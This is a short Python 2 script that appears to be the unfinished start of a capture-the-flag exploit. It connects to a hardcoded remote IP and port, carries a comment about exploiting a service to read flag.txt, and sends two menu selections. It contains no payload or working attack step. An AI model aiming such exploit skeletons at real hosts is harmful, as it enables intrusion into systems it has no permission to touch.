__author__ = 'HuyNA'
"""
    nc 54.213.239.142 28468
"""
import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "54.213.239.142"
local_host="192.168.248.157"
port = 28468
s.connect((host, port))
#s.connect((local_host, 4545))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

print "press enter to continue ... "
sys.stdin.read(1)

recv_until(s, "> ")

time.sleep(0.01)
send_data = "1\n"
s.send(send_data)

recv_until(s, "> ")

time.sleep(0.01)
send_data = "1\n"
s.send(send_data)

recv_until(s, "> ")

